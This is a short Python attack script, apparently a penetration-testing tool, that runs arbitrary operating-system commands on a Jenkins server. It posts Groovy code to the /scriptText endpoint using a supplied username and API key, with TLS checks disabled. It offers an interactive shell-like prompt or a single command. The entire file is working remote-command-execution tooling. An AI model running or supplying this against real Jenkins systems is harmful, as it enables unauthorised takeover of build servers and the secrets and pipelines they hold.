#!/usr/bin/env python3
#
#   Penetration toolkit for attacking Jenkins via the API  
#
#   Devloped by Bandrel @ TrustedSec
#   With assistance from Ben0xa for the groovy script template
#

import argparse
import requests
import urllib3
urllib3.disable_warnings()

def execute_command(ssl,target,port,user,apikey, command):
    data = f'def sout = new StringBuffer(), serr = new StringBuffer()\n\
    def proc = \'{command}\'.execute()\n\
    proc.consumeProcessOutput(sout,serr)\n\
    proc.waitForOrKill(1000)\n\
    println "$sout"\n'
    url = f'http{ssl}://{target}:{port}/scriptText'
    _http_response = requests.post(url, auth=(user, apikey),data={'script': data}, verify=False)
    print(_http_response.text)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Penetration Toolkit for attacking Jenkins via the API')
    parser.add_argument('-t','--target', required=True, type=str, help='IP or hostname of system running Jenkins API')
    parser.add_argument('-p','--port', default='8080', required=True, type=str, help='port of Jenkins API')
    parser.add_argument('--ssl', default=False, type=bool, help='enable SSL')
    parser.add_argument('-u','--user', required=True, type=str, help='Jenkins Username')
    parser.add_argument('-k','--key', required=True, type=str, help='API key')
    parser.add_argument('-c','--command', required=False, type=str, help='command')

    parser.set_defaults(id=None,command=None,logs=None,containers=None,images=None)
    args = parser.parse_args()
    target = args.target
    port = args.port
    args.ssl
    if args.ssl:
        ssl = 's'
    else:
        ssl = ''
    user = args.user
    apikey = args.key
    single_command = args.command

    if not single_command:
        while True:
            try:
                cmd_input = input('$>')
                if cmd_input.lower() in ['exit','quit']:
                    break

                data = f'''def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '{cmd_input.rstrip()}'.execute()
proc.consumeProcessOutput(sout,serr)
proc.waitForOrKill(1000)
println "$sout"
    '''
                execute_command(ssl, target, port, user, apikey, cmd_input)
            except:
                KeyboardInterrupt
                quit()
    else:
        execute_command(ssl, target, port, user, apikey, single_command)







